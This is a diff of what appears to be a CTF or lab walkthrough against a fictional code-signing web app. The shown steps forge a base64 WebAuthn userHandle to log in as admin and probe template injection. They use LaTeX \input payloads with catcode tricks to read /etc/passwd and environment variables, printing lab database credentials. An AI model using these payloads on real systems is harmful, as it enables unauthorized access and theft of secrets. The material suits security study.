@@ -356,18 +356,16 @@ sudo nginx -t && sudo systemctl reload nginx
 
 **so also when seeing the blog we can update the DATA, however it doesnt work because when the stages to update its blacklisted.**
 
-**i spend time to understand the regiter logic and the login logic i found that when we register our ID is the same the name displayed but just in base64**&#x20;
+**i spend time to understand the regiter logic and the login logic i found that when we login in this request /api/v1/auth/webauthn/auth/finish it contain an entry userHandle**&#x20;
 
 {% code overflow="wrap" %}
 ```bash
-"user":{"id":"b3AtMjAyNi0wMDQy","name":"op-2026-0042","displayName":"op-2026-0042"
-
-echo "b3AtMjAyNi0wMDQy" | base64 -d
-op-2026-0042
+"userHandle":"b3AtMjAyNi0wMDQy"
+# if we decode it in base64 it give our current user op-2026-042
 ```
 {% endcode %}
 
-**so i try on register to add the userHandle : "admin" but when i finish and i try registring with passkey i receive this error i tried many places change the ID first and add the entry in the finish register but it doesnt work so i tried to modify on the login/finish**&#x20;
+**so the idea if we can hijack this it can give us the role admin but the idea i start with is to add this entry when i register the passkey but when i finish and i try to register it give me this**&#x20;
 
 {% code overflow="wrap" %}
 ```
@@ -375,9 +373,132 @@ Authentication failed: OperatorNotFound: No active operator with handle 'admin
 ```
 {% endcode %}
 
+**Then i tried to jist change it on the on the login and it work because also in the webauth.js there is no validation for this so we can put anything , i encode in base64 admin and i put it**&#x20;
+
 **then after in the login it work**
 
 <figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 025831.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:blue;">**Step 6**</mark>
+
+**Now we should found a way to have a rev-shell,let's enumarete the app very well and do some hard fuzzing**
+
+<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+
+**I tried SSRF here in the URL i tried many paylaods but nothign pass all gives 404 so i think its not because doesnt exsit but its seems a firewall blocks our payload**
+
+**i found this pending authorization**
+
+<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+**This is a code signing system for critical software (Windows kernel drivers, firmware). As an admin (Authorising Officer), however The "Notice Templates" system is a classic SSTI target. Templates are used to generate signing certificates/notices. If i can inject template code, i get Remote Code Execution.**
+
+<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+**The template engine uses `{{ }}` and `{% %}` syntax, which is characteristic of Nunjucks (common in Node.js/Express) or Jinja2 (Python). Since we know the backend is Express, it is almost certainly Nunjucks.**<br>
+
+**so in the template body i inject `{{7*7}}`**
+
+**i save it then i click rendre preview i receive this**&#x20;
+
+<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+**i dont see any response but it can be blind because its executed in the backend from this i can understand how the process work**&#x20;
+
+1. **Nunjucks evaluates** `{{ 7 * 7 }}` → becomes `49`
+2. **Pandoc converts** the template to LaTeX
+3. **LaTeX/PDFLaTeX creates** a PDF document
+4. **The PDF is saved** to: `/var/lib/aegis-render/jobs/job-1783090909445-eab06cba/notice.final.pdf`
+{% endhint %}
+
+**However this is its just an hypothese we need to confirm it**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+\input{/etc/passwd} # LaTex Injection
+
+) (/etc/passwd
+! Missing $ inserted.
+<inserted text> 
+                $
+l.17 _
+      apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+      
+
+Overfull \hbox (57.68275pt too wide) in paragraph at lines 1--15
+[]\T1/lmr/m/n/10 root:x:0:0:root:/root:/bin/bash dae-mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ []
+
+
+Overfull \hbox (59.43445pt too wide) in paragraph at lines 1--15
+\T1/lmr/m/n/10 sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ []
+
+
+Overfull \hbox (138.23726pt too wide) in paragraph at lines 1--15
+\T1/lmr/m/n/10 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ []
+
+
+Overfull \hbox (179.87813pt too wide) in paragraph at lines 1--15
+\T1/lmr/m/n/10 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ []
+
+
+Overfull \hbox (24.7382pt too wide) in paragraph at lines 1--15
+\T1/lmr/m/n/10 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+ []
+
+
+Overfull \hbox (3.30363pt too wide) in paragraph at lines 1--15
+\T1/lmr/m/n/10 list:x:38:38:Mailing List Man-ager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin $[]\OML/lmm/m/it/10 pt \OT1/lmr/m/n/10 :
+ []
+```
+{% endcode %}
+
+**I receive a huge output containg some errors, its a huge win the intersting part is this we confirmed an LFI, so we need to chain all this to have more impact**&#x20;
+
+**i inject advanced command injection via the template body and the errors i receive make me have a clear idea of what we dealing**&#x20;
+
+{% hint style="info" %}
+1. **`\write18` is disabled: The line `runsystem(id > /tmp/rce_out.txt)...disabled.` confirms that LaTeX shell escape is turned off.I cannot execute commands directly via LaTeX.**
+2. **Markdown is mangling your backslashes: The error `\catcode\texttt{\textbackslash{}\_=12...}` shows that the web interface (likely using Pandoc/Markdown) is converting your `\catcode\_=12` into a code block `\texttt{...}`. This breaks the LaTeX syntax.**
+{% endhint %}
+
+**i tried ASCII Catcodes + LFI and it work i can read environment varilables**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+\begingroup \catcode 95=12 \catcode 38=12 \catcode 35=12 \catcode 37=12 \catcode 36=12 \input{/proc/self/environ} \endgroup
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+DB_USER=aegis_audit_publisher
+DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
+DB_HOST=172.16.0.11
+DB_DB=aegis_audit
+DB_PORT=1433
+Worker Script Path: /home/webadmin/aegis/lib/render_worker.js
+User Context: The process runs as aegis-render but was started via sudo by webadmin (UID 1000)
+```
+{% endcode %}
+
+**I tried many payloads but :**
+
+{% hint style="info" %}
+**The Ghostscript sandbox (`-dSAFER`) and LaTeX's `-no-shell-escape` flag are blocking direct command execution. This is a common hardening measure (Having this infos from reading /proc/self/cmdline)**
+{% endhint %}
+
+**i try maniulate this parameters**
+
+<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+**Making AllowRawBlocks to True but i receive that this its just affecting Pandoc (allowing raw LaTeX blocks to pass through), am sure am playing around to chain all things to found the real and functional attack path so we need just to be more overlooking all things together**
+{% endhint %}
 
